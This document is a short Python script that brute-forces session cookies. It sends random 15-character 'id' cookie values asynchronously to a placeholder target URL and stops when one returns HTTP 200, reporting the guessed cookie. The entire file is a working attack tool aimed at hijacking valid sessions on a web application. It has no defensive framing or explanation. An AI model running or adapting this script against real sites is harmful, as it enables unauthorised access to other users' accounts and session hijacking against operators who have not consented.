import aiohttp
import asyncio
import random
import string

url = "https://target.url/path/"

def generate_cookie():
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for _ in range(15))

async def check_status(session, url, cookie_name, cookie):
    try:
        cookies = {cookie_name: cookie}
        async with session.get(url, cookies=cookies) as response:
            status_code = response.status
            print(f"received status code {status_code} with cookie: {cookie}")
            if status_code == 200:
                return True, cookie
            return False, None
    except Exception as e:
        print(f"failure with cookie {cookie}: {e}")
        return False, None

async def main():
    async with aiohttp.ClientSession() as session:
        while True:
            cookie = generate_cookie()
            result, found_cookie = await check_status(session, url, 'id', cookie)
            if result:
                print(f"got 200, stopping method. Cookie: {found_cookie}")
                break

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())